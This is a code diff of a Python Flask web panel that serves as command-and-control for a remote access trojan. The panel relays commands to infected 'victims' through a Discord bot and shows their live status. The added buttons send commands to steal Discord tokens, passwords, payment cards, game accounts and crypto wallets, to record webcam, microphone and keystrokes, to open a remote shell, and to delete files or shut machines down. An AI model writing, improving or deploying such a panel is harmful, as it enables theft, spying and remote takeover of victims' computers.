@@ -1,21 +1,24 @@
-# c2.py – Ultimate C2 Panel (multi‑victim, persistent, real‑time)
+# c2.py – Ultimate C2 Panel (professional UI, grouped commands, emojis)
 # Deploy on Render with env variables BOT_TOKEN, CHANNEL_ID
+# Or run locally with hardcoded tokens.
 
 import os, time, json, threading, requests
 from flask import Flask, render_template_string, request, jsonify
-from flask_socketio import SocketIO, emit
+from flask_socketio import SocketIO
 
 app = Flask(__name__)
 socketio = SocketIO(app, cors_allowed_origins="*")
 
+# ---------- Configuration ----------
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 CHANNEL_ID = os.environ.get("CHANNEL_ID")
 if not BOT_TOKEN or not CHANNEL_ID:
-    raise ValueError("Missing BOT_TOKEN or CHANNEL_ID")
+    BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"      # <-- Replace for local testing
+    CHANNEL_ID = "YOUR_CHANNEL_ID_HERE"    # <-- Replace for local testing
 
 DATA_FILE = "victims_data.json"
-victims = {}          # victim_id -> {'last_seen': timestamp, 'logs': list}
-log_queues = {}       # victim_id -> list of recent messages
+victims = {}
+log_queues = {}
 last_id = None
 
 def load_data():
@@ -43,7 +46,7 @@ def fetch_loop():
     global last_id, victims, log_queues
     while True:
         try:
-            url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=50"
+            url = f"https://discord.com/api/v9/channels/{CHANNEL_ID}/messages?limit=10"
             headers = {"Authorization": f"Bot {BOT_TOKEN}"}
             resp = requests.get(url, headers=headers, timeout=5)
             if resp.status_code == 200:
@@ -57,7 +60,6 @@ def fetch_loop():
                         bracket = content.find("]")
                         victim_id = content[1:bracket]
                         rest = content[bracket+1:].strip()
-                        # Update victim record
                         if victim_id not in victims:
                             victims[victim_id] = {"last_seen": time.time(), "logs": []}
                         victims[victim_id]["last_seen"] = time.time()
@@ -66,14 +68,13 @@ def fetch_loop():
                         log_queues[victim_id].append(rest)
                         if len(log_queues[victim_id]) > 200:
                             log_queues[victim_id] = log_queues[victim_id][-200:]
-                        # Emit live update to all connected web clients
                         socketio.emit('new_victim', {'victims': get_victims_list()})
                         socketio.emit('new_log', {'victim': victim_id, 'log': rest})
                 if msgs:
                     last_id = msgs[0]["id"]
         except Exception as e:
             print(f"Fetch error: {e}")
-        time.sleep(2)
+        time.sleep(1)
 
 def get_victims_list():
     vlist = []
@@ -117,19 +118,19 @@ def send_command():
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)})
 
-# ---------- Beautiful HTML/CSS/JS Interface ----------
+# ---------- Gorgeous HTML/CSS/JS Interface ----------
 HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>C2 PANEL · Multi‑Victim Control</title>
+    <title>⚡ C2 PANEL · Multi‑Victim Control</title>
     <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #0b0e14;
+            background: #0a0c10;
             font-family: 'Inter', sans-serif;
             color: #eef2ff;
             padding: 24px;
@@ -230,7 +231,7 @@ HTML = """
         }
         .controls {
             flex: 1.2;
-            min-width: 320px;
+            min-width: 340px;
             background: #141824;
             border-radius: 24px;
             padding: 24px;
@@ -256,17 +257,27 @@ HTML = """
             font-size: 13px;
             font-weight: 500;
         }
+        /* Command categories */
+        .cmd-category {
+            margin-top: 16px;
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 13px;
+            color: #a855f7;
+            border-left: 3px solid #a855f7;
+            padding-left: 10px;
+        }
         .button-group {
             display: flex;
             flex-wrap: wrap;
-            gap: 10px;
-            margin: 20px 0;
+            gap: 8px;
+            margin-bottom: 16px;
         }
         button {
             background: #1e2432;
             border: none;
             color: #eef2ff;
-            padding: 8px 14px;
+            padding: 6px 12px;
             border-radius: 40px;
             cursor: pointer;
             transition: all 0.2s;
@@ -329,16 +340,70 @@ HTML = """
 <body>
 <div class="container">
     <div class="header">
-        <h1>C2 PANEL</h1>
-        <div class="badge">⚡ DISCORD RELAY · REAL‑TIME</div>
+        <h1>⚡ C2 PANEL</h1>
+        <div class="badge">🎮 Discord Relay • Real‑time</div>
     </div>
     <div class="victims-grid" id="victimsGrid"></div>
     <div class="main-panel">
         <div class="controls">
             <div class="current-victim" id="currentVictim">⚠️ No victim selected</div>
-            <div class="button-group" id="commandButtons">
-                <!-- Dynamically generated buttons from list -->
+
+            <div class="cmd-category">🖥️ System</div>
+            <div class="button-group">
+                <button onclick="sendCmd('!info')">💻 Info</button>
+                <button onclick="sendCmd('!ip')">🌐 IP</button>
+                <button onclick="sendCmd('!clip')">📋 Clipboard</button>
+                <button onclick="sendCmd('!active')">🪟 Active</button>
+                <button onclick="sendCmd('!wifi')">📶 Wi-Fi</button>
             </div>
+
+            <div class="cmd-category">🔑 Credentials</div>
+            <div class="button-group">
+                <button onclick="sendCmd('!tokens')">🎫 Discord</button>
+                <button onclick="sendCmd('!passwords')">🔑 Passwords</button>
+                <button onclick="sendCmd('!cards')">💳 Cards</button>
+                <button onclick="sendCmd('!roblox')">🍪 Roblox</button>
+                <button onclick="sendCmd('!steam')">🎮 Steam</button>
+                <button onclick="sendCmd('!wallets')">💰 Wallets</button>
+                <button onclick="sendCmd('!history')">📜 History</button>
+                <button onclick="sendCmd('!emails')">📧 Emails</button>
+            </div>
+
+            <div class="cmd-category">📸 Media</div>
+            <div class="button-group">
+                <button onclick="sendCmd('!screenshot')">📸 Screenshot</button>
+                <button onclick="sendCmd('!webcam')">🎥 Webcam</button>
+                <button onclick="sendCmd('!mic')">🎙️ Mic</button>
+                <button onclick="sendCmd('!keylog_start')">⌨️ Keylog Start</button>
+                <button onclick="sendCmd('!keylog_stop')">⏹️ Stop</button>
+                <button onclick="sendCmd('!keylog_dump')">📄 Dump</button>
+            </div>
+
+            <div class="cmd-category">📂 File</div>
+            <div class="button-group">
+                <button onclick="sendCmd('!ls C:\\\\')">📁 List C:\\</button>
+                <button onclick="sendCmd('!ls %USERPROFILE%\\\\Desktop')">🖥️ Desktop</button>
+                <button onclick="sendCmd('!cat')">📖 Read</button>
+                <button onclick="sendCmd('!rm')">🗑️ Delete</button>
+            </div>
+
+            <div class="cmd-category">⚙️ Control</div>
+            <div class="button-group">
+                <button onclick="sendCmd('!processes')">📊 Processes</button>
+                <button onclick="sendCmd('!kill')">⚡ Kill</button>
+                <button onclick="sendCmd('!shell')">🐚 Shell Start</button>
+                <button onclick="sendCmd('!shell_stop')">⏹️ Shell Stop</button>
+                <button onclick="sendCmd('!msg')">💬 Msg Box</button>
+                <button onclick="sendCmd('!lock')">🔒 Lock</button>
+                <button onclick="sendCmd('!shutdown')">⏻ Shutdown</button>
+                <button onclick="sendCmd('!restart')">⟳ Restart</button>
+                <button onclick="sendCmd('!abort')">⚠️ Abort</button>
+                <button onclick="sendCmd('!all')">⚠️ ALL DATA</button>
+                <button onclick="sendCmd('!selfdestruct')" style="background:#8b0000;">💀 Self‑Destruct</button>
+                <button onclick="sendCmd('!exit')" style="background:#8b0000;">❌ Exit RAT</button>
+            </div>
+
+            <div class="cmd-category">🎮 Custom Command</div>
             <div class="cmd-row"><input id="customCmd" placeholder="!cmd dir or !shell command"><button onclick="sendCustom()">▶️ Run</button></div>
             <div class="cmd-row"><input id="catPath" placeholder="!cat path"><button onclick="sendCmd('!cat '+catPath.value)">Read</button></div>
             <div class="cmd-row"><input id="rmPath" placeholder="!rm path"><button onclick="sendCmd('!rm '+rmPath.value)">Delete</button></div>
@@ -346,33 +411,15 @@ HTML = """
         </div>
         <div class="logs" id="logsPanel"></div>
     </div>
-    <footer>Commands sent via Discord bot · Results appear here</footer>
+    <footer>💡 Commands sent via Discord bot • Results appear here in real time</footer>
 </div>
 <script>
     const socket = io();
     let currentVictim = null;
     let victims = {};
 
-    // List of all available commands (displayed as buttons)
-    const COMMANDS = [
-        "info","ip","clip","active","wifi","tokens","passwords","cards","roblox","steam",
-        "wallets","history","emails","screenshot","webcam","mic","keylog_start","keylog_stop","keylog_dump",
-        "processes","shell","shell_stop","lock","shutdown","restart","abort","all","selfdestruct","exit"
-    ];
-
-    function buildCommandButtons() {
-        const container = document.getElementById('commandButtons');
-        container.innerHTML = '';
-        COMMANDS.forEach(cmd => {
-            const btn = document.createElement('button');
-            btn.textContent = cmd;
-            btn.onclick = () => sendCmd(`!${cmd}`);
-            container.appendChild(btn);
-        });
-    }
-
     socket.on('connect', () => console.log('WebSocket connected'));
-    socket.on('new_victim', (data) => { refreshVictims(); });
+    socket.on('new_victim', () => refreshVictims());
     socket.on('new_log', (data) => {
         if (data.victim === currentVictim) addLog(data.log);
         refreshVictims();
@@ -392,7 +439,7 @@ HTML = """
                         <span class="victim-id">${v.id}</span>
                         <div class="status-badge"><span class="${v.online ? 'online-dot' : 'offline-dot'}"></span> ${v.online ? 'ONLINE' : 'OFFLINE'}</div>
                     </div>
-                    <div class="last-seen">Last seen: ${new Date(v.last_seen * 1000).toLocaleString()}</div>
+                    <div class="last-seen">🕒 Last seen: ${new Date(v.last_seen * 1000).toLocaleString()}</div>
                 `;
                 card.onclick = () => selectVictim(v.id);
                 grid.appendChild(card);
@@ -445,9 +492,6 @@ HTML = """
         document.getElementById('customCmd').value = '';
     }
 
-    // Set up command buttons
-    buildCommandButtons();
-    // Refresh every 3 seconds
     setInterval(refreshVictims, 3000);
     refreshVictims();
 </script>
